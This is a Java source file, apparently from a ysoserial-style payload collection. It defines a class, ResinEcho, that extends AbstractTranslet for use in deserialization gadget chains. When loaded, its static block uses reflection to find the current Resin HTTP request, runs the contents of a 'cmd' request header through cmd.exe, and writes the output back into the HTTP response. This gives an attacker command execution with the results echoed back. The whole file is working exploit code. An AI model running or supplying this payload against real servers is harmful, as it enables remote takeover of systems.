package com.ding0x0.yso.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class  ResinEcho extends AbstractTranslet implements Serializable {
    static {
        try {
            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);
            Object[] obj_arr = (Object[]) obj;
            for(int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;
                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);
                if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")){
                    com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;
                    String cmd = httpRequest.getHeader("cmd");
                    if(cmd != null && !cmd.isEmpty()){
                        Process process = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
                        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                                new java.io.InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }
                        String result = stringBuilder.toString();
                        com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
                        java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream", null);
                        method.setAccessible(true);
                        com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse,null);
                        httpResponseStream.write(result.getBytes(), 0, result.length());
                        httpResponseStream.close();
                    }
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
